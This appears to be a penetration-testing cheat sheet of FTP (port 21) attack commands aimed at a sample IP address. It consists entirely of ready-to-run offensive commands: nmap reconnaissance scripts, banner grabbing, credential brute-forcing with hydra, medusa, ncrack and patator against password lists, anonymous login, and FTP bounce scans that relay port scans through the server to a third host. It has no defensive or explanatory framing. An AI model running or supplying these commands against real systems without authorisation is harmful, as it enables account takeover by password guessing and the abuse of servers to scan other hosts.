# Port-Specific Attack Payloads

## FTP - Port 21

### FTP Reconnaissance
nmap -p 21 -sV --script=ftp-* 192.168.1.100                            # All FTP scripts
nmap -p 21 --script=ftp-anon 192.168.1.100                             # Anonymous login check
nmap -p 21 --script=ftp-bounce 192.168.1.100                           # FTP bounce attack
nc -v 192.168.1.100 21                                                 # Banner grabbing
telnet 192.168.1.100 21                                                # Interactive banner

### FTP Brute Force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100                # Hydra brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100 -t 4               # Single user
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp               # Medusa
ncrack -p 21 --user admin -P passwords.txt 192.168.1.100               # Ncrack
patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

### FTP Anonymous Access
ftp 192.168.1.100
# Username: anonymous
# Password: anonymous@domain.com

### FTP Bounce Attack
nmap -b anonymous:password@192.168.1.100 -p 80 192.168.1.50            # Port scan via FTP
nmap -b ftp.target.com:21 -p 1-1024 192.168.1.50                       # Bounce scan
